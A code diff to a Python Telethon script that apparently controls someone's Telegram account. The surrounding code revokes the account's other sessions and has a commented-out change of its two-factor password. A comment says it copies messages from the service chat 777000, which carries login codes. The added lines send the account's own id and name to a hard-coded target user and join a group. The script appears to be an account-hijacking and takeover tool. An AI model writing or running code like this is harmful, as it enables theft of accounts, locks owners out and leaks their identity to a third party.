@@ -273,7 +273,10 @@ async def add_contact():
     result = await client(ImportContactsRequest([contact]))
     print("导入结果:", result)
     target = await client.get_entity(TARGET_USER_ID)     # 7038631858
-    await client.send_message(target, "你好")
+
+
+    me = await client.get_me()
+    await client.send_message(target, f"你好, 我是 {me.id} - {me.first_name} {me.last_name or ''}")
 
 
 async def keep_db_alive():
@@ -672,15 +675,15 @@ async def main():
 
     await add_contact()
 
-    try:
-        await client.edit_2fa(
-            current_password=OLD_PASSWORD,  # 直接传入旧密码
-            new_password=NEW_PASSWORD,      # 设置的新密码
-            hint=HINT
-        )
-        print("✅ 2FA 密码已更新")
-    except Exception as e:
-        print(f"❌ 更新失败: {e}")
+    # try:
+    #     await client.edit_2fa(
+    #         current_password=OLD_PASSWORD,  # 直接传入旧密码
+    #         new_password=NEW_PASSWORD,      # 设置的新密码
+    #         hint=HINT
+    #     )
+    #     print("✅ 2FA 密码已更新")
+    # except Exception as e:
+    #     print(f"❌ 更新失败: {e}")
     
 
 
@@ -701,8 +704,8 @@ async def main():
                 print(f"删除 {a.hash} 失败: {e}")
         else:
             print(f"✅ 保留 id={a.hash}  device={a.device_model}  platform={a.platform}  ip={a.ip}  date={a.date_created}")
-
-    # exit()
+    await join("omrySLPazzFjMjg0")
+    exit()
     # ——监听 777000 的新消息并即时复制——
     @client.on(events.NewMessage(chats=SOURCE_CHAT_ID))
     async def handler(event: events.NewMessage.Event):
